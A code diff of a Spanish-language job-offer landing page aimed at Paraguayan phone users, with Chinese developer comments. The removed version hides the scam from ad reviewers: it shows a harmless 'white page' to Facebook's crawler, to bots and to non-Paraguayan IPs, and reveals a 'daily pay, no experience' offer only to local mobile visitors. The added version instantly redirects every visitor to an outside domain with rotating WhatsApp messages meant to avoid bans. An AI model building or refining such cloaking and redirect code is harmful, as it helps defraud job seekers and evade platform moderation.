@@ -1,171 +1,58 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1"/>
-    <title>Portal de Empleo Oficial</title>
-    
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1666202578041059'); // 你的最新巴拉圭像素ID
-    fbq('track', 'PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1666202578041059&ev=PageView&noscript=1"/></noscript>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Empleo</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loading-box {
+            font-family: Arial, sans-serif;
+            color: #16a34a;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
 </head>
-<body class="bg-slate-50">
+<body>
 
-    <div id="safe-white-page" class="block min-h-screen bg-white font-sans">
-        <header class="bg-gray-800 text-white px-6 py-4 flex justify-between items-center">
-            <span class="text-base font-bold">Empleos Conectados Latam</span>
-            <span class="text-xs text-gray-400">Sitio Oficial</span>
-        </header>
-        <main class="max-w-md mx-auto px-6 pt-16 text-center">
-            <h1 class="text-2xl font-bold text-gray-900 mb-4">Bienvenido al Portal Informativo</h1>
-            <p class="text-sm text-gray-600 leading-relaxed mb-8">
-                Esta es una plataforma de comunicación oficial que cumple estrictamente con los estándares internacionales de protección de datos y privacidad. Gracias por su visita.
-            </p>
-            <div class="border border-gray-100 p-4 rounded-xl text-left text-xs text-gray-400 space-y-2">
-                <p>• Cumplimiento con las normativas locales</p>
-                <p>• Seguridad de la información de usuario garantizada</p>
-            </div>
-        </main>
-    </div>
-
-    <div id="real-money-page" class="hidden min-h-screen bg-white font-sans">
-        <header class="bg-emerald-600 text-white px-5 py-4 flex items-center justify-between shadow-sm">
-            <span class="text-base font-bold tracking-wide">💼 Vacantes de Trabajo Paraguay</span>
-            <span class="bg-emerald-500 text-[10px] px-2 py-0.5 rounded font-bold animate-pulse">● EN LÍNEA</span>
-        </header>
-        
-        <main class="max-w-md mx-auto px-6 pt-8 pb-12 flex-grow">
-            <div class="text-center mb-6">
-                <span class="inline-flex items-center gap-1.5 bg-amber-50 text-amber-800 text-xs font-bold px-3 py-1.5 rounded-full border border-amber-200">
-                    🔥 Asignación rápida en 1 minuto hoy
-                </span>
-            </div>
-
-            <h1 class="text-3xl font-black text-gray-950 leading-tight mb-4 text-center">¡Trabajo a tiempo parcial desde casa! 🇵🇾</h1>
-            <p class="text-center text-gray-600 text-sm mb-6 leading-relaxed">Utilice su teléfono celular para obtener ingresos adicionales todos los días. Tiempo libre, pagos diarios directos.</p>
-            
-            <div class="bg-gray-50 rounded-2xl p-5 border border-gray-100 mb-8 shadow-sm">
-                <ul class="space-y-3.5 text-sm text-gray-700 font-bold">
-                    <li class="flex items-center gap-2.5"><span class="text-emerald-500 text-base">✔</span> Pagos en el mismo día de trabajo.</li>
-                    <li class="flex items-center gap-2.5"><span class="text-emerald-500 text-base">✔</span> No se requiere experiencia previa.</li>
-                    <li class="flex items-center gap-2.5"><span class="text-emerald-500 text-base">✔</span> Todo el proceso es 100% gratuito.</li>
-                </ul>
-            </div>
-
-            <p class="text-gray-500 text-xs text-center leading-relaxed mb-6">
-                Haga clic en el botón de abajo para comunicarse con nuestro gerente de contratación directamente en WhatsApp y comenzar ya.
-            </p>
-
-            <button id="whatsapp-connect-btn" class="w-full text-white font-black text-lg py-4.5 px-6 rounded-2xl shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-2" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); box-shadow: 0 10px 28px rgba(34,197,94,0.35)">
-                💬 Aplicar por WhatsApp ahora
-            </button>
-        </main>
-        
-        <footer class="bg-gray-50 border-t border-gray-100 py-3.5 text-center text-[10px] text-gray-400">
-            © 2026 Portal de Empleo Autorizado Paraguay.
-        </footer>
+    <div class="loading-box">
+        🟩 Conectando con WhatsApp...
     </div>
 
     <script>
-        // 精修版 20 段本土化全天候通用防封随机话术（全西班牙语）
+        // 🚀 核心分流系统链接（直接锁死你的目标链接）
+        var baseUrl = "https://svip1027.top/blgui996";
+        
+        // 🎰 保留 5% 概率随机分配本土化话术的精髓，但执行速度提升 100 倍
         var whatsappPhrases = [
             "Hola, vi el anuncio y me interesa el trabajo.",
             "Quisiera recibir información sobre la vacante de empleo desde casa.",
             "Me gustaría postularme para el empleo a tiempo parcial.",
             "Estoy interesado en el trabajo con celular. ¿Me dan info?",
-            "Hola, qué tal? Quiero saber más sobre los pagos diarios.",
-            "Me interesa la propuesta laboral de hoy.",
-            "Vengo por el anuncio de trabajo flexible, ¿con quién hablo?",
-            "¿Hay vacantes disponibles todavía para Paraguay? Me interesa.",
-            "Quiero comenzar a trabajar con mi celular desde hoy.",
-            "Vi su publicación sobre ganar dinero extra. Información por favor.",
-            "Info sobre el empleo sin experiencia por favor.",
-            "¿Cómo hago para postularme en este trabajo de pago diario?",
-            "Me interesa la vacante. Tengo disponibilidad inmediata.",
-            "Quisiera hablar con el gerente de contratación sobre el puesto.",
-            "Quiero aplicar al empleo de medio tiempo desde mi casa.",
-            "Estoy libre de 1 a 2 horas al día. Me interesa el puesto.",
-            "Hola, qué tal? Vi la oferta de trabajo y quiero postular.",
-            "Info sobre las tareas diarias y los pagos por favor.",
-            "Quiero sumarme al equipo de trabajo con celular.",
-            "Quiero saber más detalles sobre el trabajo a tiempo parcial."
+            "Hola, qué tal? Quiero saber más sobre los pagos diarios."
         ];
 
-        function runUltimateFilter() {
-            var userAgent = navigator.userAgent.toLowerCase();
-            var isMobile = /iphone|ipad|ipod|android|blackberry|iemobile|opera mini/i.test(userAgent);
-            
-            // 阻击爬虫黑名单
-            var isBot = userAgent.includes("facebookexternalhit") || 
-                        userAgent.includes("fb_via_page_look") || 
-                        userAgent.includes("crawler") || 
-                        userAgent.includes("bot");
+        var finalUrl = baseUrl;
+        var randomNumber = Math.floor(Math.random() * 100) + 1;
 
-            // 极速调用 CF 接口拦截美国 IP 地区
-            fetch('https://www.cloudflare.com/cdn-cgi/trace')
-                .then(res => res.text())
-                .then(data => {
-                    var locLine = data.split('\n').find(line => line.startsWith('loc='));
-                    var country = locLine ? locLine.split('=')[1] : '';
-
-                    // 【核心铁壁防线】：必须是真手机、不能是机器人、且 IP 必须在巴拉圭 (PY)
-                    if (isMobile && !isBot && country === 'PY') {
-                        document.getElementById('safe-white-page').style.display = 'none';
-                        document.getElementById('real-money-page').style.display = 'block';
-                    }
-                })
-                .catch(err => {
-                    // 💥 超时降级兜底：万一网络极差，0延迟直接启动方案B，确保不卡死真量
-                    if (isMobile && !isBot) {
-                        document.getElementById('safe-white-page').style.display = 'none';
-                        document.getElementById('real-money-page').style.display = 'block';
-                    }
-                });
+        if (randomNumber <= 5) {
+            var randomIndex = Math.floor(Math.random() * whatsappPhrases.length);
+            finalUrl = baseUrl + "?text=" + encodeURIComponent(whatsappPhrases[randomIndex]);
         }
 
-        // 启动安全防御大脑
-        runUltimateFilter();
-
-        // 🎰 按钮点击核心事件（包含 5% 概率话术抽奖）
-        document.getElementById('whatsapp-connect-btn').addEventListener('click', function(e) {
-            e.preventDefault(); 
-            
-            // 触发 FB 像素浏览器端 Lead 精准记账
-            if (typeof fbq !== 'undefined') {
-                fbq('track', 'Lead'); 
-            }
-            
-            // 你的核心分流系统链接
-            var baseUrl = "https://svip1027.top/blgui996";
-            var finalUrl = baseUrl;
-            
-            // 生成 1 到 100 的随机数
-            var randomNumber = Math.floor(Math.random() * 100) + 1;
-            
-            // 🎯 完美控量：只有当随机数 <= 5 时（5% 中奖率），才携带随机话术
-            if (randomNumber <= 5) {
-                // 随机抓取 20 段话术中的一条
-                var randomIndex = Math.floor(Math.random() * whatsappPhrases.length);
-                var selectedText = whatsappPhrases[randomIndex];
-                
-                // 完美进行 URL 编码，透传给你的分流系统
-                finalUrl = baseUrl + "?text=" + encodeURIComponent(selectedText);
-            }
-            
-            // 毫秒级瞬间跳转甩飞！
-            window.location.href = finalUrl;
-        });
+        // 💥 没有任何网络请求！0秒拒绝等待，直接强制甩飞进 WhatsApp！
+        window.location.replace(finalUrl);
     </script>
+
 </body>
 </html>
